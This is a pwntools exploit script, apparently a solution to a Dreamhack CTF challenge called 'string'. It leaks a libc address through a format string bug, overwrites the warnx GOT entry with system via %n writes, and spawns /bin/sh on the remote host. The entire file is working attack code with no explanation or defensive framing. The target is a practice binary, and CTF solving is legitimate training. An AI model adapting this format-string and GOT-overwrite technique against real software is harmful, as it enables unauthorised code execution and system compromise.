#!/usr/bin/python3

from pwn import *

#p = process("./string")
p = remote("host1.dreamhack.games", 21275)
e = ELF("./string")
libc = ELF("./libc.so.6")

sla = lambda t, s: p.sendlineafter(t, s)

def _input(buf):
    sla("> ", str(1))
    sla(": ", buf)

def _print():
    sla("> ", str(2))
    p.recvuntil(": ")
    return p.recvline()

_input_offset = 5
_main_ret_offset = 71
__libc_start_main_ret = 0x18637     # In ubuntu 16.04

# Leak libc base
payload = f"%{_main_ret_offset}$p"
_input(payload)
_libc_base = int(_print().decode('utf-8').strip("\n"), 16) - __libc_start_main_ret
log.critical("libc base: " + hex(_libc_base))
log.critical("system: " + hex(_libc_base + libc.sym['system']))

# Manipulates warnx GOT
top = (_libc_base + libc.sym['system']) >> 16 & 0xffff
bottom = (_libc_base + libc.sym['system']) & 0xffff
payload = f"%{bottom}c".encode()
payload += f"%{_input_offset + 6}$n".encode()
payload += f"%{top - bottom}c".encode()
payload += f"%{_input_offset + 7}$n".encode()
payload += p32(e.got['warnx'])
payload += p32(e.got['warnx'] + 0x2)
_input(payload)
sla("> ", str(2))

# Enter "/bin/sh"
payload = "/bin/sh\x00"
_input(payload)

p.interactive()
